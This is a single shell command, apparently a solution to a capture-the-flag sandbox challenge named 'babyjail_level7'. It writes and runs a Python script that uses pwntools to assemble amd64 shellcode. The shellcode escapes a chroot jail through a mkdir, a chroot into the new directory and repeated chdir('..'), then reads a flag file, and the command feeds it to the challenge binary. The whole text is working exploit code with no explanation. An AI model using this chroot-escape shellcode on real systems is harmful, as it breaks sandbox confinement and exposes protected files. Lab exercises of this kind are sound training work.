echo 'import pwn
pwn.context.arch = "amd64"
sc1 = pwn.shellcraft.amd64.mkdir("test") + pwn.shellcraft.chroot("test")
sc2 = pwn.shellcraft.amd64.chdir("..") +  pwn.shellcraft.amd64.chdir("..")
read_shellcode = pwn.shellcraft.amd64.cat("./flag")
combined_code = sc1 + sc2 + read_shellcode
assembly = pwn.asm(combined_code)
with open("/home/hacker/raw", "wb") as f:
    f.write(assembly)' > sand.py && /bin/python3 sand.py && /challenge/babyjail_level7 / < raw
